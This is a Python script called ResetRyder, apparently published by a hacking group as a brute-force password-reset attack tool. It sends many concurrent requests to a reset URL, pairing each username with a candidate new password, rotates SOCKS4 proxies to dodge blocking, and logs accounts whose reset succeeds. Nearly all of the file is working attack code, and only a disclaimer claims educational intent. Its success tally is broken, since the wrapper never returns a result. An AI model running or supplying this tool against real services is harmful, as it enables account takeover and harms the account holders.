import random
import argparse
import asyncio
import aiohttp
import logging
import json

# Developer: SirCryptic (NullSecurityTeam)
# Info: ResetRyder - Brute force password reset tool - By NullSecurityTeam
# This code is intended for educational purposes only. Ensure you have permission to test any systems.

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Argument parser setup
parser = argparse.ArgumentParser(description="ResetRyder - Brute force password reset tool - By NullSecurityTeam")
parser.add_argument("-p", "--password_list", required=True, help="Path to the password list file")
parser.add_argument("-u", "--username_list", required=True, help="Path to the username list file")
parser.add_argument("-r", "--reset_password_url", required=True, help="Reset password URL")
parser.add_argument("-t", "--rate_limit_time", type=float, default=1.0, help="Rate limiting time in seconds")
parser.add_argument("-x", "--proxy_list", required=True, help="Path to the SOCKS4 proxy list file")
parser.add_argument("-a", "--max_retries", type=int, default=3, help="Maximum number of retries for failed requests")
parser.add_argument("-o", "--max_timeout", type=int, default=10, help="Maximum timeout for requests in seconds")
parser.add_argument("-c", "--max_concurrent_requests", type=int, default=10, help="Maximum number of concurrent requests")
args = parser.parse_args()

# Load data from files
def load_file(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f]

# Load configuration
password_list = load_file(args.password_list)
username_list = load_file(args.username_list)
proxy_list = load_file(args.proxy_list)

async def reset_password(session, username, password):
    for attempt in range(args.max_retries):
        payload = {
            "username": username,
            "new_password": password,
            "confirm_new_password": password
        }
        
        # Randomly select a proxy
        proxy = random.choice(proxy_list)

        try:
            async with session.post(args.reset_password_url, data=payload, proxy=f'socks4://{proxy}', timeout=args.max_timeout) as response:
                text = await response.text()

                if response.status == 200 and "password reset successful" in text.lower():
                    logging.info(f"Password reset successful for user {username}. New password: {password}")
                    return True
                else:
                    logging.warning(f"Password reset failed for user {username} with password: {password}. Response: {text}")
        except asyncio.TimeoutError:
            logging.error(f"Timeout occurred for user {username} with password: {password}. Attempt: {attempt + 1}/{args.max_retries}")
        except Exception as e:
            logging.error(f"Request failed for user {username} with password {password}: {str(e)}")

    return False

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        semaphore = asyncio.Semaphore(args.max_concurrent_requests)

        async def limited_reset(username, password):
            async with semaphore:
                await reset_password(session, username, password)
                await asyncio.sleep(args.rate_limit_time)  # Rate limiting

        for username in username_list:
            for password in password_list:
                task = asyncio.create_task(limited_reset(username, password))
                tasks.append(task)

        results = await asyncio.gather(*tasks)
        successful_requests = sum(result for result in results if result)
        logging.info(f"Total requests: {len(results)}, Successful requests: {successful_requests}")

# Entry point
if __name__ == "__main__":
    asyncio.run(main())
